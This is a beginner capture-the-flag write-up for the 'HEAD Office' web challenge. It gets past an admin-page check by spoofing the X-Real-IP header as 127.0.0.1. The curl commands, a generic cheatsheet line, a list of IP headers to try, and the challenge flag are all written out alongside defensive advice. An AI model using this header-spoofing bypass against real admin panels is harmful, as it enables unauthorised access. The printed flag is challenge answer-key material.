# Safaricom CTF — HEAD Office (Web, 250 pts)

> **Assumption:** event **Safaricom CTF (SAFCTF)**, category **Web**, difficulty
> **250 pts**, target `http://54.72.82.22:8180`. Outputs were captured live.

## 1. Challenge Overview

"HEAD Office" is a 250 pt web challenge about a site with an admin area that
says you are not allowed in. The goal is to reach the admin page and read the
flag hidden there. The trick is not a password — it is a header the server trusts
too much.

## 2. What You Need Before Starting

- **curl** — `sudo apt install curl`.
- Optionally **Burp Suite** (Community is fine) to edit headers visually.
- No account, no VPN. Time estimate: **15–30 minutes**.

## 3. Reconnaissance

1. Look at the site root:

```bash
curl -s http://54.72.82.22:8180/
```

Representative output:

```html
<h1>Head Office</h1>
<p>Internal listening room. Employees only.</p>
<!-- the page's own JavaScript sets an X-Forwarded-For header -->
```

**Why this matters:** the page advertises an "internal" area. Internal areas in
CTFs are usually protected by a weak check, such as "is the request coming from
localhost?"

2. Try to open the admin page directly:

```bash
curl -s -i http://54.72.82.22:8180/admin
```

Expected output:

```http
HTTP/1.1 403 FORBIDDEN
...
<h3>Admins only</h3>
```

**Why this matters:** `/admin` is a real page (a 403, not a 404), and it is
guarded by a server-side check we can attack.

[SCREENSHOT: the 403 "Admins only" page in the browser]

## 4. Identifying the Vulnerability

The bug is **trusting a client-supplied header for authorization** — a form of
access-control bypass. Servers sometimes decide "is this an internal request?"
by looking at an HTTP header such as `X-Forwarded-For`, `X-Real-IP`, or
`X-Client-IP`. Because *any* client can set any header, an attacker can simply
claim to be localhost (`127.0.0.1`) and pass the check.

The sign that tipped me off: the app's own JavaScript sets `X-Forwarded-For`,
which tells us the developer "thinks" in terms of that header. But the server
actually validated a *different* header, `X-Real-IP`.

**Analogy:** a bouncer checks your handwritten name tag instead of your ID.
Write "VIP" on the tag and you walk in.

## 5. Exploitation Step by Step

1. **Try the header the page hints at, `X-Forwarded-For`.** This is the natural
   first guess:

```bash
curl -s -H "X-Forwarded-For: 127.0.0.1" http://54.72.82.22:8180/admin
```

Expected output:

```html
<h3>Admins only</h3>
```

**What to look for:** still blocked. That means the server is *not* using
`X-Forwarded-For`. Dead end — good to know, so we try other IP headers.

2. **Try `X-Real-IP`, the header many Python/nginx setups use for the "real"
   client IP.** Claiming to be localhost should satisfy an "internal only" check.

```bash
curl -s -H "X-Real-IP: 127.0.0.1" http://54.72.82.22:8180/admin
```

Expected output:

```html
<h3>Welcome to the listening room!</h3><p>Flag: safctf{e657eef1b0b097c60911f62cfe4ec61b}</p>
```

**What to look for:** the 403 becomes a 200 and the flag appears. That is the win.

[SCREENSHOT: Burp Repeater with the header added and the flag in the response]

### Optional Burp Suite walkthrough

1. In Proxy, submit the request to `/admin` and intercept it.
2. Right-click → **Send to Repeater**.
3. In Repeater's **Request headers**, add a line: `X-Real-IP: 127.0.0.1`.
4. Click **Send** and read the response.

## 6. Capturing the Flag

The flag is in the HTML returned by `/admin`:

```
safctf{e657eef1b0b097c60911f62cfe4ec61b}
```

## 7. Why This Works (Beginner Explanation)

If a program decides "are you allowed?" using a value you send in the request,
then you control the answer. Headers like `X-Real-IP` are meant for *trusted
proxies* to pass along the client's true IP — but if the server itself is
exposed (no proxy in front, or the proxy does not overwrite the header), anyone
can set it.

In the real world this bug class lets attackers reach admin panels, internal
APIs, and monitoring pages from the internet, simply by claiming to be inside
the network. It is one of the most common "it works in production" mistakes.

## 8. Common Mistakes and Dead Ends

- **Only trying `X-Forwarded-For`.** That is the most famous header, so it is
  often filtered or ignored. Here only `X-Real-IP` worked.
- **Chasing a password/login.** There is none; the block is purely an
  IP/header check.
- **Sending `127.0.0.1` in the URL or body** instead of a header. The server
  reads the header, not the path.
- **Giving up after the 403.** A 403 (not 404) confirms the page exists and is
  guarded — always probe *how* it is guarded.

## 9. How to Defend Against This

- Never authorize based on client-supplied headers (`X-Real-IP`,
  `X-Forwarded-For`, `X-Client-IP`, `Host`).
- If you must use a proxy header, have your trusted reverse proxy **overwrite**
  it and drop it from untrusted clients, then read it only from the proxy.
- Enforce access control with real authentication/authorization (sessions,
  tokens, roles) rather than "looks internal".
- Bind internal-only services to a private interface or firewall them, instead
  of exposing them and checking a header.

## 10. Key Takeaways

- A 403 (not 404) means "exists but blocked" — probe the guard.
- Try a *family* of IP headers: `X-Forwarded-For`, `X-Real-IP`, `X-Client-IP`,
  `X-Remote-Addr`.
- Cheatsheet:
  `curl -s -H "X-Real-IP: 127.0.0.1" http://TARGET/admin`
- **Flag:** `safctf{e657eef1b0b097c60911f62cfe4ec61b}`

You just learned to question *where* a server gets its security decisions from —
that mindset pays off constantly.
